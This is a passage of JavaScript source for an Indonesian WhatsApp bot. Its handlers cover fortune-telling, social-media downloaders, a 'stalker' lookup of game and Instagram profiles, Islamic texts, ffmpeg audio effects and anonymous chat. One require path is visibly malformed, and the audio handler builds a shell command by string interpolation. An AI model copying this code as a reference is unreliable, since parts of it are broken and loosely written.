                jobotz.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tanggal}\n│➳ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n│➳ *Watak Hari :* ${anu.message.watak_hari}\n│➳ *Naga Hari :* ${anu.message.naga_hari}\n│➳ *Jam Baik :* ${anu.message.jam_baik}\n│➳ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Nama :* ${anu.message.nama}\n│➳ *Lahir :* ${anu.message.tgl_lahir}\n│➳ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Tanggal :* ${anu.message.tgl_memancing}\n│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Hasil :* ${anu.message.result}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Zodiak :* ${anu.message.zodiak}\n│➳ *Nomor :* ${anu.message.nomor_keberuntungan}\n│➳ *Aroma :* ${anu.message.aroma_keberuntungan}\n│➳ *Planet :* ${anu.message.planet_yang_mengitari}\n│➳ *Bunga :* ${anu.message.bunga_keberuntungan}\n│➳ *Warna :* ${anu.message.warna_keberuntungan}\n│➳ *Batu :* ${anu.message.batu_keberuntungan}\n│➳ *Elemen :* ${anu.message.elemen_keberuntungan}\n│➳ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n│➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return repjo(anu.message)
                jobotz.sendText(m.chat, `│➳ *Hasil :* ${anu.message}`, m)
            }
            break
	    case 'stalker': case 'stalk': {
	    if (!isCreator && !isBan) return
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return repjo('Limit Harian Anda Telah Habis')
                if (!text) return repjo(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return repjo(anu.result.message)
                    repjo(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return repjo(anu.result.message)
                    repjo(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return repjo(anu.result.message)
                    repjo(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return repjo(anu.result.message)
                    repjo(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return repjo(anu.result.message)
                    repjo(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return repjo(anu.result.message)
                    jobotz.sendMedia(m.chat, anu.caption.profile_hd, '', `│➳ Full Name : ${anu.caption.full_name}\n│➳ User Name : ${anu.caption.user_name}\n│➳ ID ${anu.caption.user_id}\n│➳ Followers : ${anu.caption.followers}\n│➳ Following : ${anu.caption.following}\n│➳ Bussines : ${anu.caption.bussines}\n│➳ Profesional : ${anu.caption.profesional}\n│➳ Verified : ${anu.caption.verified}\n│➳ Private : ${anu.caption.private}\n│➳ Bio : ${anu.caption.biography}\n│➳ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return repjo(anu.result.message)
                    repjo(`│➳ Name : ${anu.name}\n│➳ Version : ${Object.keys(anu.versions)}\n│➳ Created : ${tanggal(anu.time.created)}\n│➳ Modified : ${tanggal(anu.time.modified)}\n│➳ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n│➳ Description : ${anu.description}\n│➳ Homepage : ${anu.homepage}\n│➳ Keywords : ${anu.keywords}\n│➳ Author : ${anu.author.name}\n│➳ License : ${anu.license}\n│➳ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    repjo(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
	        case 'tiktok': case 'tiktoknowm': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                repjo(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.nowatermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokwm': case 'tiktokwatermark': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                repjo(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.watermark },
                    caption: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokmp3': case 'tiktokaudio': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                repjo(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► With Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
                jobotz.sendMessage(m.chat, { audio: { url: anu.result.audio }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'No Query Url!'
                repjo(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) jobotz.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    jobotz.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
            case 'joox': case 'jooxdl': {
            if (!isCreator && !isBan) return
                if (!text) throw 'No Query Title'
                repjo(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await jobotz.sendImage(m.chat, anu.result.img, `│➳ Title : ${anu.result.lagu}\n│➳ Album : ${anu.result.album}\n│➳ Singer : ${anu.result.penyanyi}\n│➳ Publish : ${anu.result.publish}\n│➳ Lirik :\n${anu.result.lirik.result}`, m)
                jobotz.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
            if (!isCreator && !isBan) return
                if (!text) throw 'No Query Title'
                repjo(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await jobotz.sendImage(m.chat, anu.result.thumb, `│➳ Title : ${anu.result.title}\n│➳ Url : ${isUrl(text)[0]}`)
                jobotz.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                repjo(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
            if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                repjo(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
                jobotz.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                repjo(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                jobotz.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `│➳ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pindl': case 'pinterestdl': {
	        if (!isCreator && !isBan) return
                if (!text) throw 'Masukkan Query Link!'
                repjo(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                jobotz.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
            if (!isCreator && !isBan) return
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
│➳ Title : ${anu.title}
│➳ Author : ${anu.author.name}
│➳ Like : ${anu.like}
│➳ Caption : ${anu.caption}
│➳ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: jobotz.user.name,
			buttons,
			headerType: 4
		    }
		    jobotz.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        jobotz.sendMessage(m.chat, { image: { url }, caption: `│➳ Title : ${anu.title}\n│➳ Author : ${anu.author.name}\n│➳ Like : ${anu.like}\n│➳ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
        if (!isCreator && !isBan) return
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		jobotz.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		if (!isCreator && !isBan) return
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		jobotz.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => repjo(oh))
		}
		break
		case 'juzamma': {
		if (!isCreator && !isBan) return
		if (args[0] === 'pdf') {
		repjo(mess.wait)
		jobotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		repjo(mess.wait)
		jobotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		repjo(mess.wait)
		jobotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		repjo(mess.wait)
		jobotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		repjo(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case 'hadis': case 'hadist': {
		if (!isCreator && !isBan) return
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		repjo(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		repjo(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!isCreator && !isBan) return
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		repjo(txt)
		jobotz.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!isCreator && !isBan) return
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		repjo(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
		   if (!isCreator && !isBan) return
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                repjo(mess.wait)
                let media = await jobotz.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return repjo(err)
                let buff = fs.readFileSync(ran)
                jobotz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else repjo(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                repjo(e)
                }
                break
            case 'setcmd': {
            if (!isCreator) return
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                repjo(`Done!`)
            }
            break
            case 'delcmd': {
            if (!isCreator && !isBan) return
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                repjo(`Done!`)
            }
            break
            case 'listcmd': {
            if (!isCreator && !isBan) return
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                jobotz.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator && !isBan) return
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                repjo('Done!')
            }
            break
            case 'addmsg': {
            if (!isCreator && !isBan) return
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
repjo(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                jobotz.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
            if (!isCreator && !isBan) return
                let msgs = JSON.parse(fs.readFileSync('./lib/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        repjo(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
            if (!isCreator && !isBan) return
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return repjo(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		repjo(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
	    if (!isCreator && !isBan) return
                if (m.isGroup) return repjo('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                jobotz.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await jobotz.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, jobotz.user.name, m)
            }
			break
            case 'keluar': case 'leave': {
            if (!isCreator && !isBan) return
                if (m.isGroup) return repjo('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                repjo('Ok')
                let other = room.other(m.sender)
                if (other) await jobotz.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
            if (!isCreator && !isBan) return
                if (m.isGroup) return repjo('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, jobotz.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, jobotz.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await jobotz.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, jobotz.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await jobotz.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, jobotz.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
            if (!isCreator && !isBan) return
                if (m.isGroup) return repjo('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
